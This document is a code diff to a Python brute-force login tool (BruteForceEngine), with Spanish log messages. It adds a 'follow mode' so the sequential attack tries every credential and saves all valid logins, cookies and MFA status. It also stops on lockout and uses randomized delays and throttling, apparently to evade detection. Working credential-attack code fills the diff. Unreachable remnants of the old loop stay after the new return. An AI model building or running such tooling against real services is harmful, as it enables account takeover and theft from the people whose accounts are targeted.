@@ -862,9 +862,61 @@ class BruteForceEngine:
                 elapsed_time=elapsed, score=-100, error_message=str(e),
             )
 
-    def run_attack_sequential(self, credentials: List[Credential]) -> Optional[AttemptResult]:
-        """Tries credentials one at a time, stopping at the first success."""
+    def run_attack_sequential(self, credentials: List[Credential],
+                              follow_mode: bool = False) -> Optional[AttemptResult]:
+        """
+        Tries credentials one at a time.
+        Stops at the first success unless follow_mode is True,
+        in which case it exhausts all credentials and returns the first success found.
+        """
         self.logger.info(f"Iniciando ataque secuencial con {len(credentials)} credenciales")
+        if follow_mode:
+            self.logger.info("[+] Modo FOLLOW activado - buscará TODAS las credenciales válidas")
+
+        first_success = None
+
+        for i, cred in enumerate(credentials, 1):
+            if self.stop_attack:
+                break
+
+            self.logger.info(f"[{i}/{len(credentials)}] Probando: {cred}")
+            result = self.try_credential(cred)
+            self.statistics.add_attempt(result)
+
+            if result.success:
+                self.logger.info(f"[+] ¡CREDENCIALES VÁLIDAS! {cred}")
+                self.logger.info(f"   Score:   {result.score}")
+                self.logger.info(f"   Status:  {result.status_code}")
+                self.logger.info(f"   Cookies: {len(result.cookies)}")
+                if result.has_mfa:
+                    self.logger.warning("   [!] 2FA/MFA detectado - acceso parcial")
+
+                self.found_credentials.append(result)
+                self._save_individual_credential(result)
+
+                if not first_success:
+                    first_success = result
+
+                if not follow_mode:
+                    return result
+
+            elif result.is_blocked:
+                self.logger.error("[X] BLOQUEO DETECTADO - Deteniendo ataque")
+                self.stop_attack = True
+                break
+
+            self._apply_auto_throttling()
+
+            if i < len(credentials):
+                delay = (
+                    get_random_delay(self.statistics.current_delay,
+                                     self.config.get('delay_randomization', 0.3))
+                    if self.config.get('randomize_delays', True)
+                    else self.statistics.current_delay
+                )
+                time.sleep(delay)
+
+        return first_success
 
         for i, cred in enumerate(credentials, 1):
             if self.stop_attack:
@@ -1123,7 +1175,7 @@ def main():
         if args.threads > 1:
             result = engine.run_attack_concurrent(credentials, args.threads, args.follow)
         else:
-            result = engine.run_attack_sequential(credentials)
+            result = engine.run_attack_sequential(credentials, args.follow)
 
         engine.save_results(result, args.output_dir)
 
